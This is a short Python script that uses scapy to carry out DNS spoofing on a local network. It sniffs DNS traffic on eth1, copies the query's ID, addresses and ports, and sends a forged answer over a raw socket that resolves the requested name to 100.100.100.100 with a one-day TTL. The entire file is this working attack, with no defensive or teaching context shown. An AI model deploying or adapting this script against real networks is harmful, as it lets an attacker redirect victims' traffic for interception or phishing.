#!/usr/bin/env python
import sys,time,re,subprocess,os,threading,uuid,signal
from scapy.all import *


pkts=sniff(iface="eth1",filter="udp port 53",count=3)

answer=pkts[0].getlayer(DNS)
dnsid=int(answer.id)
hosts=str(answer.qd.qname)
srcmac=str(pkts[0].getlayer(Ether).dst)
dstmac=str(pkts[0].getlayer(Ether).src)
srcip=str(pkts[0].getlayer(IP).dst)
dstip=str(pkts[0].getlayer(IP).src)
srcport=int(pkts[0].getlayer(UDP).dport)
dstport=int(pkts[0].getlayer(UDP).sport)

dns_answer=Ether(dst=dstmac,src=srcmac)/IP(src=srcip,dst=dstip)/UDP(sport=srcport,dport=dstport)/DNS(id=dnsid,qr=1,rd=1,ra=1,ancount=1,qdcount=1)/DNSQR(qname=hosts,qtype="A",qclass="IN")/DNSRR(rrname=hosts,ttl=86400,rdata="100.100.100.100")


s= socket.socket(socket.AF_PACKET,socket.SOCK_RAW,0x0800)
s.bind(("eth1",50007))
time.sleep(2)

s.send(str(dns_answer))

s.close
